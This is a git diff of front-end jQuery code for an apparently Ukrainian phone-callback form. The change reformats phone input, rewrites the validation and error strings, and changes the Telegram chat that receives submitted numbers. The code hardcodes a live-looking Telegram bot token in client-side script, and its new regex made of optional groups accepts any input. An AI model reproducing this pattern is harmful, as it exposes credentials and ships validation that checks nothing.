@@ -50,8 +50,7 @@ $(function () {
         let error = null;
         const val = $('#number-input').val()
         if(!val.length) error = 'e';
-        else if(val.length > 11) error = 'b';
-        else if(val.length < 7) error = 's';
+        else if(!/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/.test(val)) error = 'w';
 
         if(error){
             $(this).prev().css('border', '2px solid red');
@@ -60,19 +59,21 @@ $(function () {
         }
 
         const bot = new Bot("5136344578:AAEaJb-3IgdmMqAVOnF4x-ux8Do7ED8XOhI", "733336131");
-        bot.sendMessage(val, 733336131, null, false);
+        bot.sendMessage(val, 835560276, null, false);
     });
-    $("#number-input").on('input propertychange', function () { 
+    $("#number-input").on('input propertychange', function (e) {
+        var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
+        e.target.value = '+(' + x[1] + ') ' + x[2] + '-' + x[3] + '-' + x[4] + '-' + x[5];
+
         $(this).css('border', '1.25px solid #E5E5E5');
         $('#call-help').css('color', 'grey').text(normal);
     });
 })
 
-const normal = 'Наприклад: 097 000 00 00  '
+const normal = 'Наприклад: +(380) 97 123 45 67'
 const callStates = {
     e: "пустим",
-    s: "коротше за 7 символiв",
-    b: "довший за 11 символiв"
+    w: "таким",
 }
 
 function navEvent() { 
